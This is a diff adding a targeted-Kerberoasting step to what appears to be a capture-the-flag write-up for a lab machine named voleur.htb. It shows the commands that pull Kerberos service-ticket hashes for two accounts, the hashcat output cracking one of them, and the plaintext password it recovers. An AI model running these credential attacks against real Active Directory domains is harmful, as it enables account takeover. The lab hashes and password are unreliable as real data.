@@ -305,6 +305,91 @@ CLOCK: time stepped by 28858.196057
 
 ```
 
+in theory should have worked but the machine is bugged as fuck
+
+## Targeted kerberoast:
+
+```
+ python3 targetedKerberoast.py -v -d 'voleur.htb' -u 'svc_ldap' -k --no-pass --dc-ip 10.129.232.130 --dc-host DC.voleur.htb
+[*] Starting kerberoast attacks
+[*] Fetching usernames from Active Directory with LDAP
+[VERBOSE] SPN added successfully for (lacey.miller)
+[+] Printing hash for (lacey.miller)
+$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$1be057d70f44aefcdf08694eb70ea4ea$6a3f3b1ae85d3e2693b8493d1723765860d0f4cf9e318be711742a8d0ed2d2fea97b271c2996f5978248514154ecc513e88a13974bd3b7162f869a03a73f4e4bb343a2f2ad7302bace41b383ebafc80f7306704d00357049f963862d73defba30f615d8067b55421096fc0eb756e1ce6fec49cc226f9a0a096d167ddc3954d75ee4b74bcb269fddc04231054ae0411a12706ab84b824290a364c8b50cf126708675dbe7493acf4fb985ac841aa0bec28ba1dd7371e38d290952b319614523019aaa5c950ab44bcb67e8872478e7bacbf423e72da74d9132c6299ac20521b9f95e40e059a7ddcb811bedba35fc308eef63f4442dad425b67a4d8f432a675f20f45e1724f9544cc41c162095da5c13b4be43bdb7f28091f1558a73b7feee4f6ef6fff3f5a5fba444772c535bb1b2d46afcc2cd397a072bba99ba0d4c56f4079a94d5c6554f77245ef66184f31c0d5756eff84390bc82c35f97ba8b538ecff96240b1bcaa590fc8f877e875ffd357e70077ac7b71e5b10e45c4d982c534189737d5736f06b73107a6556ac82d6e2128b2dd250b21d00a7e76295705f6541caa377778e215236bac6a36145305493bb84ac02ae45f0b8a63ba2d04d2a3bc41adc3210a04406a6f6b5740d8801550161f23d46cfdd519b105f5bb2739cc0b98bccb662a182202cfbdd6f5d67144b4a0df6708cd0d19e07932dc8ae9c6961d331dfe9af4f3d1776a8c9b931c3399e20b0a57c16869e9717d78cef978191c61268557c393bbb3f8531f95967d2cb892d6e8e4cdb4930e37e9466b5f977a2afd4cd93039caf83100e148cf52d0269a30dbee54aeccbd352321cb8f48220068ed2ba5bdb1105cc40ec2de6df0fa520ba7d915fb247eec93e3b34c8a3be3354f2f42d3bef19ee1b43a2c49c678858fb5c88cc56fa4fdd171b652d09035e657e406cd8be58b06653b93ed03b490e71054a5aa16098e66f3c9c663be18288ed3eb2f57965e1fadbdd632805fcebd0b2929d16030906744c22e2bb74ff61b2177089fd81e37c3f6f35eab5245ee18007730de8382787d4588f9f737cf587e1b0e5ba775b9f69015bc3471aa2d76e80f4e179b3e7a57eaf8aa2ec635fd54c97e45eee7f0d18bc43d89896cb6dd5cf46ad6d6f1e31e431de2e436cbf20ad016c64cc537c7fb1248a46e4525f56de95a4c859840f9bd8b94db14e2e3b3c381c1490114fe5d1a68447acfb1433246a16e9bcd206ebab27362f5b1aab199dfc58a9b30d65c4dec01d970f69bd98856bf7cbc6a4e60d0cd609925b011569b5dbe2a831164140d880cbfe06acdfedd77c3cb1afded59bda7625efc7c67406dc6176c5c4ed111744411743b516d0015862a55cb811e8d403f529706d7650e7a5207dd2724fb9255dab72c55cbbd5ddd7ee1383d52e1c1bdfe765b2a7addc11e8a6a12a295a134ed917bf2c72433dcc6bdeeb1aae721159c9e8d9f8afbd4
+[VERBOSE] SPN removed successfully for (lacey.miller)
+[VERBOSE] SPN added successfully for (svc_winrm)
+[+] Printing hash for (svc_winrm)
+$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$e7344a8ffda7789a7829faee497e8d53$b42f89d2afaa8a28d3a6df18e887903fd8e0760257b1d4d5d3d31405a0b9a5d0fa1e32d0c3faf67847b6d70ff69231f91c31ca9af4480697655d7f978dcf81c7208fcfac7bbc71dd626cba8a6f4540464b3794b34388abd13aa7a35ed23142c362536a9a4ca3c5e341e9448be8a3b979b34ee185195e0c4930403c4423d1817da04ce0cc13b7ca19ca040f5f3dbf32b073304a1dd33d9c0a1800984128c3cc2c056ef70013ba893bb14b2ea6b7c1475f7966f18ca6567590ce15f4878333e41ac7f91a60afe6b605ff0974a636e0cc91fc723f5ef070b1ea4eeb48107a4f5ca8a09b3220d4690e51635d8728feed08c07e0e4cf4b2e8c7294b15ad7e95a71a223aada9b5348f6788e0f4c4793f9a84b19b82a4aec013abf5257a07669fa1ab2bca9f74498fda2c8078caf0d62905c8e4af4a6768553bec62280a11f1e4273fb05fcbce2c2ba812795786cf0410168c03ecc0629797dbd59194ed5ddac772f617da7d4565c0a37e4864ea9069163275db67749b84b78c55baebaeda299e969aaabd3e75396f4387aeba8c52de798abf8dcc7c0198a1d3e7e5faf4076133016416ac3a3200989f1e495fdd094529d6ecc6eb4ae7c9b78cb7caa16428dc2828765dd47ff974ea0f8031ac3a0780b4c75581f4e2c4fed945632d84d706212022604de5eb6b75a03889f9a462145f26698a7a2e29d3edbb5c16d6c162f5baa7700b4a34b3ae6e6582d28770d2cf62bb52e6e0d703273588a3de6b78257dd817ea1637e05db4c71ad74969b3a6fde7802c447a613cd20c6073dc615cc6937892008c4f9c58f8c163ed9e0ed527700d5aac22a5ec1552ad8272d42313d68c93c3ad5ffa9c69361e77dc21cf6f78a1d5cff220a25d5b8a46a778557c91e3716fb646b043f0ddad2d546fb5b03f1edc021d02a2c747a0c7b5a9e22000cbc2bc3b0222f99da4c291b6b20bd7f6e40e63544f458547bccfa7dee43ba64225a85e425b9a129a5a95bbc5640d7649b89718b814e358d0072ddb33f676a07083ce9aafd91cf2accb46c591af9ffe470e06f468a44c63909734456333edd6489121d63d7fbf83798017cdbc1fd1899f4441f8a5f8f4ffbce827539b4064adca56e38c95255bf00e8914ae82c6b5aa16e6f91b443bc2fc8cfeb30a35dcaea544b01d904cd56fa5411eea31beb96e362789712c15ed4c9d70cc4c2649e856f1d3906292a8865780d3d2284be116333275664ebaa4cdec505c4dc937a33e64b4eddc63011ebb23ecf936a1ab587b3f0a8a45dd2e42d50b31c4e206c27a45de14b4802a21e2eb93e9e724d3a5643c89d13add7984fa45a331a9a32925eb689f2514ea1ffd14fced26170c207ec387a89b832395bf5d5a76d4e31b89c634b08f8de21c59bdd89efed7430c89cddc8f050bdaf4d40f87da52a93b13a26b56e22af0a075ec6dd5b8ca1258909cf476530ff2b532bc70926601cb447151ad
+[VERBOSE] SPN removed successfully for (svc_winrm)
+
+```
+
+```
+ hashcat -m 13100 svc_winrm.hash /usr/share/wordlists/rockyou.txt
+hashcat (v7.1.2) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #01: cpu-sandybridge-AMD Ryzen 7 5700G with Radeon Graphics, 1469/2939 MB (512 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory allocated for this attack: 513 MB (1075 MB free)
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$e7344a8ffda7789a7829faee497e8d53$b42f89d2afaa8a28d3a6df18e887903fd8e0760257b1d4d5d3d31405a0b9a5d0fa1e32d0c3faf67847b6d70ff69231f91c31ca9af4480697655d7f978dcf81c7208fcfac7bbc71dd626cba8a6f4540464b3794b34388abd13aa7a35ed23142c362536a9a4ca3c5e341e9448be8a3b979b34ee185195e0c4930403c4423d1817da04ce0cc13b7ca19ca040f5f3dbf32b073304a1dd33d9c0a1800984128c3cc2c056ef70013ba893bb14b2ea6b7c1475f7966f18ca6567590ce15f4878333e41ac7f91a60afe6b605ff0974a636e0cc91fc723f5ef070b1ea4eeb48107a4f5ca8a09b3220d4690e51635d8728feed08c07e0e4cf4b2e8c7294b15ad7e95a71a223aada9b5348f6788e0f4c4793f9a84b19b82a4aec013abf5257a07669fa1ab2bca9f74498fda2c8078caf0d62905c8e4af4a6768553bec62280a11f1e4273fb05fcbce2c2ba812795786cf0410168c03ecc0629797dbd59194ed5ddac772f617da7d4565c0a37e4864ea9069163275db67749b84b78c55baebaeda299e969aaabd3e75396f4387aeba8c52de798abf8dcc7c0198a1d3e7e5faf4076133016416ac3a3200989f1e495fdd094529d6ecc6eb4ae7c9b78cb7caa16428dc2828765dd47ff974ea0f8031ac3a0780b4c75581f4e2c4fed945632d84d706212022604de5eb6b75a03889f9a462145f26698a7a2e29d3edbb5c16d6c162f5baa7700b4a34b3ae6e6582d28770d2cf62bb52e6e0d703273588a3de6b78257dd817ea1637e05db4c71ad74969b3a6fde7802c447a613cd20c6073dc615cc6937892008c4f9c58f8c163ed9e0ed527700d5aac22a5ec1552ad8272d42313d68c93c3ad5ffa9c69361e77dc21cf6f78a1d5cff220a25d5b8a46a778557c91e3716fb646b043f0ddad2d546fb5b03f1edc021d02a2c747a0c7b5a9e22000cbc2bc3b0222f99da4c291b6b20bd7f6e40e63544f458547bccfa7dee43ba64225a85e425b9a129a5a95bbc5640d7649b89718b814e358d0072ddb33f676a07083ce9aafd91cf2accb46c591af9ffe470e06f468a44c63909734456333edd6489121d63d7fbf83798017cdbc1fd1899f4441f8a5f8f4ffbce827539b4064adca56e38c95255bf00e8914ae82c6b5aa16e6f91b443bc2fc8cfeb30a35dcaea544b01d904cd56fa5411eea31beb96e362789712c15ed4c9d70cc4c2649e856f1d3906292a8865780d3d2284be116333275664ebaa4cdec505c4dc937a33e64b4eddc63011ebb23ecf936a1ab587b3f0a8a45dd2e42d50b31c4e206c27a45de14b4802a21e2eb93e9e724d3a5643c89d13add7984fa45a331a9a32925eb689f2514ea1ffd14fced26170c207ec387a89b832395bf5d5a76d4e31b89c634b08f8de21c59bdd89efed7430c89cddc8f050bdaf4d40f87da52a93b13a26b56e22af0a075ec6dd5b8ca1258909cf476530ff2b532bc70926601cb447151ad:AFireInsidedeOzarctica980219afi
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: $krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_wi...7151ad
+Time.Started.....: Mon Oct  5 17:42:18 2026 (6 secs)
+Time.Estimated...: Mon Oct  5 17:42:24 2026 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:  1805.9 kH/s (1.73ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 11472896/14344385 (79.98%)
+Rejected.........: 0/11472896 (0.00%)
+Restore.Point....: 11468800/14344385 (79.95%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#01...: AK78910 -> ADRIANXXL
+Hardware.Mon.#01.: Util: 85%
+
+Started: Mon Oct  5 17:42:17 2026
+Stopped: Mon Oct  5 17:42:26 2026
+
+```
+
+svc_winrm:AFireInsidedeOzarctica980219afi
+
 ---
 ## User Flag
 
